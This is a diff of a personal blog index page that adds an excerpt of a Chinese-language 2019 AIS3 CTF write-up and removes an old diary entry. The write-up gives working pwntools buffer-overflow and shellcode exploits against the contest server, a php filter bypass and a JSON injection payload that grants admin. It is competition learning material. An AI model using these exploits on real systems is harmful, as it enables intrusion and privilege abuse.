@@ -204,6 +204,103 @@
             <div class="postShorten-header">
                 <h1 class="postShorten-title">
                     
+                        <a class="link-unstyled" href="/post/2019-ais3-ctf-writeup/">
+                            2019_ais3_ctf_writeup
+                        </a>
+                    
+                </h1>
+                <div class="postShorten-meta">
+    <time datetime="2019-07-13T09:32:14+08:00">
+	
+		    7月 13, 2019
+    	
+    </time>
+    
+</div>
+
+            </div>
+            
+                <div class="postShorten-content">
+                    <h1 id="Pwn"><a href="#Pwn" class="headerlink" title="Pwn"></a>Pwn</h1><h2 id="Welcome-BOF"><a href="#Welcome-BOF" class="headerlink" title="Welcome BOF"></a>Welcome BOF</h2><ul>
+<li><p>用objdump 或 ida 知道 [rbp-30h] ，必須壓過48 + 8 個byte，才能到return_address，但奇怪的是蓋48才過??</p>
+</li>
+<li><p>然後要跳的這<code>0000000000400687 &lt;welcome_to_ais3_2019&gt;</code></p>
+</li>
+<li><p>利用pwntools</p>
+</li>
+</ul>
+<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch = <span class="string">'i386'</span>, os = <span class="string">'linux'</span>)</span><br><span class="line"></span><br><span class="line">host = <span class="string">'pre-exam-pwn.ais3.org'</span></span><br><span class="line">port = <span class="number">10001</span></span><br><span class="line"></span><br><span class="line">r = remote(host, port)</span><br><span class="line"></span><br><span class="line">p = <span class="number">0x0000000000400687</span></span><br><span class="line">payload = p64(p)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">r.recvline()</span><br><span class="line">r.sendline(<span class="string">'A'</span>*<span class="number">48</span> + payload)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>
+<h2 id="ORW"><a href="#ORW" class="headerlink" title="ORW"></a>ORW</h2><ul>
+<li>x86-64的結構</li>
+<li>裡用shellcraft產的shell-code，注入輸入點</li>
+<li>一樣查看buffer-overflow的點，跳到.data的address<code>0x00000000006010A0</code>，利用ida查看</li>
+</ul>
+<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch = <span class="string">'amd64'</span>, os = <span class="string">'linux'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">host = <span class="string">'pre-exam-pwn.ais3.org'</span></span><br><span class="line">port = <span class="number">10001</span></span><br><span class="line"></span><br><span class="line">r = remote(host, port)</span><br><span class="line"></span><br><span class="line"><span class="comment"># debug</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">context.log_level = 'debug'</span></span><br><span class="line"><span class="string">context.terminal = ['deepin-terminal', '-x', 'sh' ,'-c']</span></span><br><span class="line"><span class="string">if args.G:</span></span><br><span class="line"><span class="string">    gdb.attach(p)</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">shellcode = <span class="string">''</span></span><br><span class="line">shellcode += shellcraft.pushstr(<span class="string">'/home/orw/flag'</span>)</span><br><span class="line">shellcode += shellcraft.open(<span class="string">'rsp'</span>, <span class="number">0</span>, <span class="number">0</span>)</span><br><span class="line">shellcode += shellcraft.read(<span class="string">'rax'</span>, <span class="string">'rsp'</span>, <span class="number">100</span>)</span><br><span class="line">shellcode += shellcraft.write(<span class="number">1</span>, <span class="string">'rsp'</span>, <span class="number">100</span>)</span><br><span class="line"></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">log.info(shellcode)</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"></span><br><span class="line">log.info(shellcode)</span><br><span class="line">r.recvline()</span><br><span class="line"></span><br><span class="line">r.sendline(asm(shellcode))</span><br><span class="line">r.recvline()</span><br><span class="line">p = <span class="number">0x00000000006010A0</span></span><br><span class="line">r.sendline(<span class="string">'A'</span>*<span class="number">40</span> + p64(p))</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>
+<h1 id="reverse"><a href="#reverse" class="headerlink" title="reverse"></a>reverse</h1><h2 id="Trivial"><a href="#Trivial" class="headerlink" title="Trivial"></a>Trivial</h2><ul>
+<li>用ida組出flag</li>
+</ul>
+<h1 id="web"><a href="#web" class="headerlink" title="web"></a>web</h1><h2 id="SimpleWindow"><a href="#SimpleWindow" class="headerlink" title="SimpleWindow"></a>SimpleWindow</h2><ul>
+<li>須利用離線版查看，可利用chorme工具改成offline顯示</li>
+</ul>
+<h2 id="Hidden"><a href="#Hidden" class="headerlink" title="Hidden"></a>Hidden</h2><ul>
+<li>在console中跑jscode，運行r()的function</li>
+</ul>
+<h2 id="d1v1n6"><a href="#d1v1n6" class="headerlink" title="d1v1n6"></a>d1v1n6</h2><ul>
+<li>phpfilter，把index.php打包起來</li>
+<li>decode之後發現不能用127.0.0.1，0.0.0.0</li>
+<li>filter 包起 <a href="http://localhost" target="_blank" rel="noopener">http://localhost</a></li>
+<li>decode出來就是結果</li>
+</ul>
+<h1 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h1><h2 id="TCash"><a href="#TCash" class="headerlink" title="TCash"></a>TCash</h2><ul>
+<li>將上面的ascii字元用md5 &amp; sha256照做一次，會有一張表</li>
+<li>將兩個的結果做比對，取交集就是flag</li>
+</ul>
+<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> md5,sha256</span><br><span class="line">cand = <span class="string">'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPWRSTUVWXYZ1234567890@,- _&#123;&#125;'</span></span><br><span class="line"></span><br><span class="line">md5dic = &#123;&#125;</span><br><span class="line">sha256dic = &#123;&#125;</span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">f = open('news.txt','w')</span></span><br><span class="line"><span class="string">f2 = open('news2.txt','w')</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line">md5s = [<span class="number">41</span>, <span class="number">63</span>, <span class="number">46</span>, <span class="number">51</span>, <span class="number">6</span>, <span class="number">26</span>, <span class="number">42</span>, <span class="number">50</span>, <span class="number">44</span>, <span class="number">33</span>, <span class="number">29</span>, <span class="number">50</span>, <span class="number">27</span>, <span class="number">28</span>, <span class="number">30</span>, <span class="number">17</span>, <span class="number">31</span>, <span class="number">19</span>, <span class="number">46</span>, <span class="number">50</span>, <span class="number">33</span>, <span class="number">45</span>, <span class="number">26</span>, <span class="number">26</span>, <span class="number">29</span>, <span class="number">31</span>, <span class="number">52</span>, <span class="number">33</span>, <span class="number">1</span>, <span class="number">45</span>, <span class="number">31</span>, <span class="number">22</span>, <span class="number">50</span>, <span class="number">50</span>, <span class="number">50</span>, <span class="number">50</span>, <span class="number">50</span>, <span class="number">31</span>, <span class="number">22</span>, <span class="number">50</span>, <span class="number">44</span>, <span class="number">26</span>, <span class="number">44</span>, <span class="number">49</span>, <span class="number">50</span>, <span class="number">49</span>, <span class="number">26</span>, <span class="number">45</span>, <span class="number">31</span>, <span class="number">30</span>, <span class="number">22</span>, <span class="number">44</span>, <span class="number">30</span>, <span class="number">31</span>, <span class="number">17</span>, <span class="number">50</span>, <span class="number">50</span>, <span class="number">50</span>, <span class="number">31</span>, <span class="number">43</span>, <span class="number">52</span>, <span class="number">50</span>, <span class="number">53</span>, <span class="number">31</span>, <span class="number">30</span>, <span class="number">17</span>, <span class="number">26</span>, <span class="number">31</span>, <span class="number">46</span>, <span class="number">41</span>, <span class="number">44</span>, <span class="number">26</span>, <span class="number">31</span>, <span class="number">52</span>, <span class="number">50</span>, <span class="number">30</span>, <span class="number">31</span>, <span class="number">26</span>, <span class="number">39</span>, <span class="number">31</span>, <span class="number">46</span>, <span class="number">33</span>, <span class="number">27</span>, <span class="number">1</span>, <span class="number">42</span>, <span class="number">50</span>, <span class="number">31</span>, <span class="number">30</span>, <span class="number">12</span>, <span class="number">26</span>, <span class="number">27</span>, <span class="number">52</span>, <span class="number">31</span>, <span class="number">30</span>, <span class="number">12</span>, <span class="number">31</span>, <span class="number">46</span>, <span class="number">26</span>, <span class="number">27</span>, <span class="number">14</span>, <span class="number">50</span>, <span class="number">31</span>, <span class="number">22</span>, <span class="number">52</span>, <span class="number">33</span>, <span class="number">31</span>, <span class="number">41</span>, <span class="number">50</span>, <span class="number">46</span>, <span class="number">31</span>, <span class="number">22</span>, <span class="number">23</span>, <span class="number">41</span>, <span class="number">31</span>, <span class="number">53</span>, <span class="number">26</span>, <span class="number">21</span>, <span class="number">31</span>, <span class="number">33</span>, <span class="number">30</span>, <span class="number">31</span>, <span class="number">19</span>, <span class="number">39</span>, <span class="number">51</span>, <span class="number">33</span>, <span class="number">30</span>, <span class="number">39</span>, <span class="number">51</span>, <span class="number">12</span>, <span class="number">58</span>, <span class="number">60</span>, <span class="number">31</span>, <span class="number">41</span>, <span class="number">33</span>, <span class="number">53</span>, <span class="number">31</span>, <span class="number">3</span>, <span class="number">17</span>, <span class="number">50</span>, <span class="number">31</span>, <span class="number">51</span>, <span class="number">26</span>, <span class="number">29</span>, <span class="number">52</span>, <span class="number">31</span>, <span class="number">33</span>, <span class="number">22</span>, <span class="number">26</span>, <span class="number">31</span>, <span class="number">41</span>, <span class="number">51</span>, <span class="number">54</span>, <span class="number">41</span>, <span class="number">29</span>, <span class="number">52</span>, <span class="number">31</span>, <span class="number">19</span>, <span class="number">23</span>, <span class="number">33</span>, <span class="number">30</span>, <span class="number">44</span>, <span class="number">26</span>, <span class="number">27</span>, <span class="number">38</span>, <span class="number">8</span>, <span class="number">50</span>, <span class="number">29</span>, <span class="number">15</span>]</span><br><span class="line">sha256s = [<span class="number">61</span>, <span class="number">44</span>, <span class="number">3</span>, <span class="number">14</span>, <span class="number">22</span>, <span class="number">41</span>, <span class="number">43</span>, <span class="number">30</span>, <span class="number">49</span>, <span class="number">59</span>, <span class="number">58</span>, <span class="number">30</span>, <span class="number">11</span>, <span class="number">3</span>, <span class="number">24</span>, <span class="number">35</span>, <span class="number">40</span>, <span class="number">46</span>, <span class="number">3</span>, <span class="number">42</span>, <span class="number">59</span>, <span class="number">36</span>, <span class="number">41</span>, <span class="number">41</span>, <span class="number">41</span>, <span class="number">40</span>, <span class="number">9</span>, <span class="number">59</span>, <span class="number">23</span>, <span class="number">36</span>, <span class="number">40</span>, <span class="number">33</span>, <span class="number">42</span>, <span class="number">42</span>, <span class="number">42</span>, <span class="number">42</span>, <span class="number">42</span>, <span class="number">40</span>, <span class="number">44</span>, <span class="number">42</span>, <span class="number">49</span>, <span class="number">24</span>, <span class="number">49</span>, <span class="number">28</span>, <span class="number">42</span>, <span class="number">33</span>, <span class="number">24</span>, <span class="number">36</span>, <span class="number">40</span>, <span class="number">24</span>, <span class="number">33</span>, <span class="number">10</span>, <span class="number">24</span>, <span class="number">40</span>, <span class="number">35</span>, <span class="number">42</span>, <span class="number">42</span>, <span class="number">42</span>, <span class="number">40</span>, <span class="number">39</span>, <span class="number">9</span>, <span class="number">42</span>, <span class="number">3</span>, <span class="number">40</span>, <span class="number">24</span>, <span class="number">35</span>, <span class="number">24</span>, <span class="number">40</span>, <span class="number">3</span>, <span class="number">61</span>, <span class="number">49</span>, <span class="number">24</span>, <span class="number">40</span>, <span class="number">9</span>, <span class="number">42</span>, <span class="number">24</span>, <span class="number">40</span>, <span class="number">41</span>, <span class="number">17</span>, <span class="number">40</span>, <span class="number">12</span>, <span class="number">57</span>, <span class="number">11</span>, <span class="number">23</span>, <span class="number">43</span>, <span class="number">42</span>, <span class="number">40</span>, <span class="number">24</span>, <span class="number">18</span>, <span class="number">41</span>, <span class="number">11</span>, <span class="number">9</span>, <span class="number">40</span>, <span class="number">24</span>, <span class="number">18</span>, <span class="number">40</span>, <span class="number">3</span>, <span class="number">41</span>, <span class="number">11</span>, <span class="number">12</span>, <span class="number">42</span>, <span class="number">40</span>, <span class="number">44</span>, <span class="number">9</span>, <span class="number">59</span>, <span class="number">40</span>, <span class="number">61</span>, <span class="number">42</span>, <span class="number">3</span>, <span class="number">40</span>, <span class="number">44</span>, <span class="number">13</span>, <span class="number">61</span>, <span class="number">40</span>, <span class="number">3</span>, <span class="number">24</span>, <span class="number">29</span>, <span class="number">40</span>, <span class="number">59</span>, <span class="number">24</span>, <span class="number">40</span>, <span class="number">19</span>, <span class="number">18</span>, <span class="number">6</span>, <span class="number">59</span>, <span class="number">24</span>, <span class="number">18</span>, <span class="number">6</span>, <span class="number">22</span>, <span class="number">0</span>, <span class="number">39</span>, <span class="number">40</span>, <span class="number">61</span>, <span class="number">57</span>, <span class="number">3</span>, <span class="number">40</span>, <span class="number">17</span>, <span class="number">35</span>, <span class="number">42</span>, <span class="number">40</span>, <span class="number">58</span>, <span class="number">24</span>, <span class="number">58</span>, <span class="number">9</span>, <span class="number">40</span>, <span class="number">59</span>, <span class="number">44</span>, <span class="number">24</span>, <span class="number">40</span>, <span class="number">61</span>, <span class="number">48</span>, <span class="number">52</span>, <span class="number">61</span>, <span class="number">58</span>, <span class="number">9</span>, <span class="number">40</span>, <span class="number">19</span>, <span class="number">13</span>, <span class="number">59</span>, <span class="number">24</span>, <span class="number">53</span>, <span class="number">41</span>, <span class="number">11</span>, <span class="number">55</span>, <span class="number">55</span>, <span class="number">42</span>, <span class="number">58</span>, <span class="number">18</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> cand:</span><br><span class="line">	md5dic.setdefault(int(md5(i.encode()).hexdigest(),<span class="number">16</span>) % <span class="number">64</span>, []).append(i)</span><br><span class="line">	sha256dic.setdefault(int(sha256(i.encode()).hexdigest(),<span class="number">16</span>) % <span class="number">64</span>, []).append(i)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i, j <span class="keyword">in</span> zip(md5s, sha256s):</span><br><span class="line">	<span class="keyword">for</span> ii <span class="keyword">in</span> md5dic[i]:</span><br><span class="line">		<span class="keyword">if</span> ii <span class="keyword">in</span> sha256dic[j]:</span><br><span class="line">			print(str(ii), end=<span class="string">''</span>)	<span class="comment"># print(md5dic[i], sha256dic[j], end='\n\n')</span></span><br></pre></td></tr></table></figure>
+<h1 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h1><h2 id="Welcome"><a href="#Welcome" class="headerlink" title="Welcome"></a>Welcome</h2><ul>
+<li>簽到題</li>
+</ul>
+<h2 id="KcufsJ"><a href="#KcufsJ" class="headerlink" title="KcufsJ"></a>KcufsJ</h2><ul>
+<li>將code reverse 然後 run</li>
+</ul>
+<h2 id="Are-you-admin"><a href="#Are-you-admin" class="headerlink" title="Are you admin?"></a>Are you admin?</h2><ul>
+<li>command injection<ul>
+<li>讓name 對到 fucker</li>
+<li>is_admin 對到 yes</li>
+<li>接下來讓隨便的東西對到dictionary，才能將is_admin做忽略</li>
+<li>最後再補上一個對照，因為最後有個引號</li>
+</ul>
+</li>
+</ul>
+<p><code>{\&quot;name\&quot;:\&quot;#{name}\&quot;,\&quot;is_admin\&quot;:\&quot;no\&quot;, \&quot;age\&quot;:\&quot;#{age}\&quot;}</code></p>
+<ul>
+<li><code>fucker&quot;,&quot;is_admin&quot;:&quot;yes&quot;,&quot;2&quot;:{&quot;a&quot;:&quot;b</code></li>
+<li><code>18&quot;},&quot;1&quot;:&quot;2</code></li>
+</ul>
+
+                    
+                        
+
+                    
+                    
+                        <p>
+                            <a href="/post/2019-ais3-ctf-writeup/#post-footer" class="postShorten-excerpt_link link">
+                                留言與分享
+                            </a>
+                        </p>
+                    
+                </div>
+            
+        </div>
+        
+    </article>
+    
+    
+    <article class="postShorten postShorten--thumbnailimg-bottom">
+        <div class="postShorten-wrap">
+            
+            <div class="postShorten-header">
+                <h1 class="postShorten-title">
+                    
                         <a class="link-unstyled" href="/post/Diary26/">
                             Diary26
                         </a>
@@ -675,59 +772,6 @@
                     
                         <p>
                             <a href="/post/Diary18/#post-footer" class="postShorten-excerpt_link link">
-                                留言與分享
-                            </a>
-                        </p>
-                    
-                </div>
-            
-        </div>
-        
-    </article>
-    
-    
-    <article class="postShorten postShorten--thumbnailimg-bottom">
-        <div class="postShorten-wrap">
-            
-            <div class="postShorten-header">
-                <h1 class="postShorten-title">
-                    
-                        <a class="link-unstyled" href="/post/Diary17/">
-                            Diary17
-                        </a>
-                    
-                </h1>
-                <div class="postShorten-meta">
-    <time datetime="2019-03-22T19:19:36+08:00">
-	
-		    3月 22, 2019
-    	
-    </time>
-    
-</div>
-
-            </div>
-            
-                <div class="postShorten-content">
-                    <h2 id="今日課程"><a href="#今日課程" class="headerlink" title="今日課程"></a>今日課程</h2><ul>
-<li>演算法</li>
-<li>英文</li>
-</ul>
-<h2 id="今日體驗"><a href="#今日體驗" class="headerlink" title="今日體驗"></a>今日體驗</h2><ul>
-<li>演算法終於把上次沒有證明成功的merge-sort證完了，只能說估複雜度實在是很麻煩，不過似乎是必經之路，英文課依然是先測驗，再上課，覺得有點無趣了。下禮拜似乎也是個大考驗，希望能比這星期進步</li>
-</ul>
-<h2 id="今日做到的事情"><a href="#今日做到的事情" class="headerlink" title="今日做到的事情"></a>今日做到的事情</h2><ul>
-<li style="list-style: none"><input type="checkbox" checked> 英文小說</li>
-<li style="list-style: none"><input type="checkbox" checked> Pygame-debuging</li>
-</ul>
-
-                    
-                        
-
-                    
-                    
-                        <p>
-                            <a href="/post/Diary17/#post-footer" class="postShorten-excerpt_link link">
                                 留言與分享
                             </a>
                         </p>
